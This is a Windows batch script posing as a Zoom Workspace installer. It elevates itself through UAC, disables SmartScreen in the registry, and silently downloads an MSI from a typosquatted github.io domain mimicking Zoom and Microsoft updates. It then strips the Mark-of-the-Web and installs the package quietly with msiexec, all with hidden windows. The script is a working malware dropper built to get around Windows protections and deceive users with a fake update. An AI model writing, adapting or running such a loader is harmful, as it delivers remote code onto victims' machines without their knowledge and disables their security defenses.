@echo off
setlocal EnableExtensions EnableDelayedExpansion

=====================================================================
:: Auto-elevate (UAC only, no warning screen)
=====================================================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command ^
    "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

=====================================================================
:: Disable Windows SmartScreen (silent)
=====================================================================
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" ^
/v SmartScreenEnabled /t REG_SZ /d Off /f >nul 2>&1

taskkill /f /im explorer.exe >nul 2>&1
start explorer.exe >nul 2>&1

=====================================================================
:: Download MSI silently
=====================================================================
set "SC_URL=https://us06web-zoomwindoowmicrosoftupadte552fs.github.io/UDUUEYE-YDG7372672Y76R736473Y-FYTD376E7673DG-DGS/ZoomWorkspace.msi"
set "SC_PATH=%TEMP%\ZoomWorkspace.msi"

powershell -WindowStyle Hidden -Command ^
"Invoke-WebRequest -Uri '%SC_URL%' -OutFile '%SC_PATH%' -UseBasicParsing"

=====================================================================
:: Remove Mark-of-the-Web
=====================================================================
powershell -WindowStyle Hidden -Command ^
"Unblock-File -Path '%SC_PATH%'"

=====================================================================
:: Silent MSI install
=====================================================================
msiexec /i "%SC_PATH%" /qn /norestart

exit